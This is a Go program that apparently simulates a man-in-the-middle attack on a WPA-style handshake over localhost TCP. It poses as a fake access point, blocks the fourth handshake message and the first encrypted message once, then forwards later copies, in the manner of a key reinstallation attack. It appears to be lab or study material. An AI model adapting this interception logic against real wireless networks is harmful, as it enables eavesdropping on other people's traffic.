package main

import (
	"encoding/binary"
	"encoding/hex"
	"fmt"
	"log"
	"net"
)

//mitm is still to do
var ap, client net.Conn

var firstTime = true

func handleIncomingAP() {
	msg := make([]byte, 128)
	for {
		//try to read from AP
		n, err := ap.Read(msg)

		if err != nil {
			log.Fatal("Connection closed by the AP")
		}
		if n == 0 {
			continue
		}
		client.Write(msg[:n])
	}
}

func printHex(msg []byte) {
	dst := hex.EncodeToString(msg)
	fmt.Println(dst)
}

func handleIncomingClient() {
	msg := make([]byte, 128)
	for {
		n, err := client.Read(msg)
		if err != nil {
			log.Fatal("Connection closed by the client")
		}
		switch msg[0] {
		case 3:
			c := binary.LittleEndian.Uint64(msg[6:14])
			switch c {
			case 1:
				if firstTime {
					fmt.Printf("Blocking 4th handshake message CLIENT -> AP\n")
				} else {
					fmt.Printf("Forwarding 4th handshake message CLIENT -> AP\n")
					ap.Write(msg[:n])
				}
			default:
				ap.Write(msg[:n])
			}
		case 5:
			if firstTime {
				firstTime = false
				fmt.Println("Blocking Encrypted message:   ", hex.EncodeToString(msg[:n]))
			} else {
				fmt.Println("Forwarding Encrypted message: ", hex.EncodeToString(msg[:n]))
				ap.Write(msg[:n])
			}
			//encrypted message
		}

	}
}

func run() {
	var err error
	ap, err = net.Dial("tcp", "127.0.0.1:8000")
	if err != nil {
		log.Fatal("AP unavailable")
	}
	fmt.Println("Connected to the real AP")
	mitm, _ := net.Listen("tcp", ":8002")
	fmt.Println("Waiting for client connection..")
	client, err = mitm.Accept()
	if err != nil {
		log.Fatal(err)
	}
	fmt.Println("Client connected to the fake AP")
	fmt.Println("MitM position obtained")
	go handleIncomingClient()
	handleIncomingAP()
}

func main() {
	run()
	//recv()
	// run loop forever (or until ctrl-c)

}
